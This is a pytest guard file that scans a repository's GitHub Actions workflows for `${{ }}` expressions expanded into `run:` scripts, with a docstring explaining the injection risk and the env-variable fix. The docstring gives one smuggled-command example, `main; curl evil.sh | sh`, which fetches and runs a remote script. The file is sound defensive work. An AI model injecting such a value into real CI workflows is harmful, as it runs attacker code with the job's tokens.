"""Guards the CI workflows against expression injection — a `${{ }}` expanded into a `run:` script.

GitHub expands `${{ … }}` into a step's script **before** the shell parses it, so an interpolated value is
read as shell *source*, not as data. A workflow input of `main; curl evil.sh | sh` therefore runs that
command on the runner, with whatever token and permissions the job holds.

`github-release.yml` had exactly that shape: `git push origin ${{ inputs.release-branch }}` in a job with
`contents: write` (SonarCloud `githubactions:S7630`, the repo's only real BLOCKER). The fix — and the rule
this file enforces — is that a value reaches the script through `env:` and is quoted there:

```yaml
run: git push origin "$RELEASE_BRANCH"
env:
  RELEASE_BRANCH: ${{ inputs.release-branch }}
```

Scripts are read from the **parsed** YAML (a step's `run:`), never from the raw file text, so a `${{ }}`
inside a YAML comment does not trip the guard and one inside a folded block scalar does not escape it.

`matrix.*` is the one exemption, and a conditional one. A matrix value is a literal written in the same
workflow, so it is author-controlled and cannot carry a payload — unless the matrix itself is *computed*
(`matrix: ${{ fromJSON(inputs.spec) }}`), which puts external text back into the expansion. The guard
therefore allows `matrix.*` only in a job whose `strategy` holds no expression of its own.

`secrets.*` is deliberately not exempt: a secret interpolated into a script is a different bug (it lands in
the run log), and it belongs in `env:` for the same reason.
"""

import pathlib
import re

import pytest
import yaml

#: Repository root — this file lives in `<root>/tests/`.
ROOT = pathlib.Path(__file__).resolve().parents[1]

#: Where GitHub reads workflow definitions from.
WORKFLOWS = ROOT / ".github" / "workflows"

#: A `${{ matrix.… }}` reference, exempt when the job's matrix is a literal.
MATRIX_REFERENCE = re.compile(r"\$\{\{\s*matrix\.[A-Za-z0-9_.-]+\s*\}\}")


def _workflow_files() -> list:
    """Return every workflow definition in the repository.

    Returns:
        The `.yml` / `.yaml` files under `.github/workflows`, sorted by name.
    """
    return sorted(WORKFLOWS.glob("*.yml")) + sorted(WORKFLOWS.glob("*.yaml"))


def _steps(job: dict) -> list:
    """Return a job's steps, tolerating a job that declares none.

    Args:
        job: One entry of a workflow's `jobs` mapping.

    Returns:
        The job's steps, or an empty list for a `uses:` job that has none.
    """
    steps = job.get("steps") or []
    return [step for step in steps if isinstance(step, dict)]


def _matrix_is_literal(job: dict) -> bool:
    """Whether a job's matrix is written out in the workflow rather than computed from an expression.

    Args:
        job: One entry of a workflow's `jobs` mapping.

    Returns:
        `True` when nothing in the job's `strategy` is itself a `${{ }}` expression, so every `matrix.*`
        value is a literal this repository's authors control.
    """
    return "${{" not in yaml.safe_dump(job.get("strategy") or {})


def _run_scripts(path: pathlib.Path) -> list:
    """Return every `run:` script in a workflow, with enough context to name it in a failure.

    Args:
        path: The workflow file.

    Returns:
        `(job_id, step_name, script, matrix_is_literal)` for each step that runs a script.
    """
    document = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
    scripts = []
    for job_id, job in (document.get("jobs") or {}).items():
        if not isinstance(job, dict):
            continue
        literal = _matrix_is_literal(job)
        for index, step in enumerate(_steps(job)):
            script = step.get("run")
            if isinstance(script, str):
                scripts.append(
                    (job_id, step.get("name", f"step {index}"), script, literal)
                )
    return scripts


def _unexempt(line: str, matrix_is_literal: bool) -> bool:
    """Whether a script line still interpolates an expression once the matrix exemption is applied.

    Args:
        line: One line of a `run:` script.
        matrix_is_literal: Whether the job's matrix is written out rather than computed.

    Returns:
        `True` when a `${{ }}` remains that a shell would execute.
    """
    if matrix_is_literal:
        line = MATRIX_REFERENCE.sub("", line)
    return "${{" in line


class TestNoExpressionReachesAShellAsSource:
    """`${{ }}` in a `run:` script is shell source; it belongs in `env:` instead."""

    def test_the_workflow_directory_is_where_it_is_expected(self):
        """So the whole file cannot pass by scanning nothing."""
        assert WORKFLOWS.is_dir(), f"no workflow directory at {WORKFLOWS}"
        assert _workflow_files(), f"no workflow files under {WORKFLOWS}"

    def test_some_workflow_actually_runs_a_script(self):
        """The guard below is vacuous if nothing in the repository runs one."""
        total = sum(len(_run_scripts(path)) for path in _workflow_files())
        assert total > 0, "no `run:` step found — the guard would pass vacuously"

    def test_the_matrix_exemption_is_not_a_blanket_one(self):
        """A computed matrix puts external text back into the expansion, so it is not exempt.

        Test scenario:
            The exemption exists because a matrix value is a literal in the same file. A job whose
            `strategy` is itself an expression — `matrix: ${{ fromJSON(inputs.spec) }}` — breaks that
            assumption, and `matrix.*` must stop being waived there.
        """
        computed = {"strategy": {"matrix": "${{ fromJSON(inputs.spec) }}"}}
        assert _matrix_is_literal(computed) is False, (
            "a computed matrix is not a literal"
        )
        assert _matrix_is_literal({"strategy": {"matrix": {"env": ["dev"]}}}) is True
        line = "pixi run -e ${{ matrix.environment }} main"
        assert _unexempt(line, matrix_is_literal=True) is False, (
            "a literal matrix is waived"
        )
        assert _unexempt(line, matrix_is_literal=False) is True, "a computed one is not"

    @pytest.mark.parametrize("path", _workflow_files(), ids=lambda path: path.name)
    def test_no_run_script_interpolates_an_expression(self, path):
        """Every `${{ }}` a script needs is passed through `env:` and read as a variable.

        Args:
            path: The workflow under test.

        Test scenario:
            `git push origin ${{ inputs.release-branch }}` in `github-release.yml` let a caller-supplied
            branch name execute as a command in a job holding `contents: write`. Values now arrive as
            environment variables, which the shell reads as data whatever they contain.
        """
        offenders = [
            f"{path.name} / job {job_id} / {step_name}: {line.strip()}"
            for job_id, step_name, script, matrix_is_literal in _run_scripts(path)
            for line in script.split("\n")
            if _unexempt(line, matrix_is_literal)
        ]
        assert offenders == [], (
            "a workflow expression is expanded into a shell script, where its value is executed rather "
            "than read. Pass it through `env:` and quote the variable instead:\n  "
            + "\n  ".join(offenders)
        )
